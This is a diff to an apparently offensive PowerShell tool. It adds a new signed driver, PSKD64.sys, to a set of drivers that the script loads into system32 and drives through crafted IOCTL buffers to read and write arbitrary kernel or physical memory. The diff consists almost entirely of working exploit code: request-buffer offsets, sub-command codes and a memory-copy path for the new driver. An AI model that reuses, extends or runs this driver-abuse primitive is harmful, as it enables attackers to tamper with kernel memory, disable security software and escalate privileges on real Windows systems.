@@ -67,7 +67,7 @@ using namespace System.Windows.Forms
             "EBIoDispatch", "CcProtect", "EnPortv", "xkpsm", "pcdsrvc_x64",
             "AsrDrv107", "Pmxdrv", "pmxdrv64", "MyPortIO_x64", "MyPortIO0",
             "athpexnt", "MonProcessEX", "ktapi", "shdrv_x64", "shdrv",
-            "signed", "WinNotify", "DCRCVDrv", "DCRCVDRV_U"
+            "signed", "WinNotify", "DCRCVDrv", "DCRCVDRV_U", "PSKD64"
 
  $Binary | % {
     $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
@@ -1673,7 +1673,7 @@ Invoke-MemoryOperation `
     -ValueType Int
 #>
 
-# CmUpx, AdvCare, pcdsrvc, AsrDrv
+# CmUpx, AdvCare, pcdsrvc, AsrDrv, PSKD
 Function Invoke-MemoryOperation {
     [CmdletBinding(DefaultParameterSetName = 'Read')]
     param (
@@ -1681,7 +1681,7 @@ Function Invoke-MemoryOperation {
         [Int64]$PA = 0L,
 
         [Parameter(Mandatory = $true)]
-        [ValidateSet('CmUpx', 'AdvCare', 'pcdsrvc', 'AsrDrv')]
+        [ValidateSet('CmUpx', 'AdvCare', 'pcdsrvc', 'AsrDrv', 'PSKD')]
         [string]$DriverName,
 
         # --- WRITE MODES ---
@@ -1706,7 +1706,10 @@ Function Invoke-MemoryOperation {
         [Parameter(ParameterSetName = 'Read')] 
         [switch]$AsInt,
         [Parameter(ParameterSetName = 'Read')] 
-        [switch]$AsLong
+        [switch]$AsLong,
+
+        # PSKD Case Only
+        [switch]$UseVirtualAddress
     )
 
     $PackDriverPackage = {
@@ -1801,6 +1804,12 @@ Function Invoke-MemoryOperation {
             Import-EmbeddedBlock -BlockName AsrDrv -OutPath 'C:\windows\system32\AsrDrv107.sys' | Out-Null 
         }
     }
+    if ($DriverName -eq 'PSKD') {
+        if (-not [File]::Exists("C:\windows\system32\PSKD64.sys")) {
+            throw "Put PSKD64.sys in system32 Directory"
+            #Import-EmbeddedBlock -BlockName PSKD -OutPath 'C:\windows\system32\PSKD64.sys' | Out-Null 
+        }
+    }
     if ($Mode -like 'Write*') {
         if ($Mode -eq 'WriteRaw') {
             $PayloadBytes = $Data
@@ -1824,6 +1833,68 @@ Function Invoke-MemoryOperation {
 
     # 2. Driver Configuration Mapping
     switch ($DriverName) {
+        'PSKD' {   
+            $IOCTL      = 0x220044
+            $DeviceName = 'PSKD64'
+
+            $IsWrite = $Mode -like 'Write*'
+
+            if ($IsWrite) {
+                $SubCommand     = 0x701F
+                $TargetLength   = $PayloadBytes.Length
+                
+            } else {
+                $SubCommand     = 0x701E
+                $TargetLength   = ($Length + 3) -band (-bnot 3)
+            }
+            $WidthFlag = if ($TargetLength % 8 -eq 0) { 8 } elseif ($TargetLength % 4 -eq 0) { 4 } elseif ($TargetLength % 2 -eq 0) { 2 } else { 1 }
+
+            # Allocate direct C++ style request buffer (0xC0 header + size payload)
+            $BaseHeaderSize = 0xC0
+            $TotalSize      = $BaseHeaderSize + $TargetLength
+            $ReqBuffer      = New-Object byte[] $TotalSize
+
+            # 1. Setup Request Headers
+            [BitConverter]::GetBytes([UInt32]1).CopyTo($ReqBuffer, 0x00)
+            [BitConverter]::GetBytes([UInt32]$SubCommand).CopyTo($ReqBuffer, 0x2C)
+            [BitConverter]::GetBytes([UInt32]$TotalSize).CopyTo($ReqBuffer, 0x34)
+
+            # 2. Setup Inner Transfer Packet (starts at offset 0x94)
+            $ReqBuffer[0x94] = 1                  # AddressSpaceType = 1 (Memory/MMIO)
+            $ReqBuffer[0x95] = [byte]$WidthFlag   # Granularity / WidthFlag
+
+            [BitConverter]::GetBytes([Int64]$VA).CopyTo($ReqBuffer, 0xA4) # VA Pointer
+            [BitConverter]::GetBytes([Int64]0).CopyTo($ReqBuffer,   0x9C) # Base = 0
+
+            <#
+            if ($UseVirtualAddress) {
+                # --- VIRTUAL ADDRESS MODE ---
+                [BitConverter]::GetBytes([Int64]$VA).CopyTo($ReqBuffer, 0xA4) # VA Pointer
+                [BitConverter]::GetBytes([Int64]0).CopyTo($ReqBuffer,   0x9C) # Base = 0
+            } else {
+                # --- PHYSICAL ADDRESS MODE ---
+                [BitConverter]::GetBytes([Int64]0).CopyTo($ReqBuffer,   0xA4) # Disable VA override
+                [BitConverter]::GetBytes([Int64]$PA).CopyTo($ReqBuffer, 0x9C) # Physical Address
+            }
+            #>
+
+            [BitConverter]::GetBytes([UInt32]$TargetLength).CopyTo($ReqBuffer, 0xAC) # Transfer Length
+
+            # 3. If writing, copy source data into payload buffer at offset 0xC0
+            if ($IsWrite -and $PayloadBytes) {
+                [Array]::Copy($PayloadBytes, 0, $ReqBuffer, 0xC0, $PayloadBytes.Length)
+            }
+
+            $OutputSizeHint  = $TotalSize
+            $OutputBuffer    = New-Object byte[] $OutputSizeHint
+
+            $Outbytes      = New-IntPtr -Size 4
+            $InOutBuffer   = New-IntPtr -Data $ReqBuffer
+            $BufferSize    = $ReqBuffer.Length
+            
+            $OutBuffer     = $InOutBuffer
+            $OutBufferSize = $BufferSize
+        }
         'AsrDrv' {
                 
             $IOCTL      = 2288640
@@ -1984,6 +2055,9 @@ Function Invoke-MemoryOperation {
             if ($DriverName -eq 'CmUpx') {
                 $SourcePointer = [IntPtr]([Int64]$InOutBuffer)
                 [Marshal]::Copy($SourcePointer, $ManagedBytes, 0, $PayloadSize)
+            } elseif ($DriverName -eq 'PSKD') {
+                $SourcePointer = [IntPtr]::Add($InOutBuffer, 0xC0)
+                [Marshal]::Copy($SourcePointer, $ManagedBytes, 0, $PayloadSize)
             } elseif ($DriverName -eq 'pcdsrvc') {
                 $SourcePointer = [IntPtr]([Int64]$OutBuffer)
                 [Marshal]::Copy($SourcePointer, $ManagedBytes, 0, $PayloadSize)
@@ -2005,7 +2079,6 @@ Function Invoke-MemoryOperation {
         Write-Error $_
         return $false
     } finally {
-        # 6. Resource Cleanup
         Free-IntPtr $RetBytes
         Free-IntPtr $InOutBuffer
         Free-IntPtr $PayloadBuf
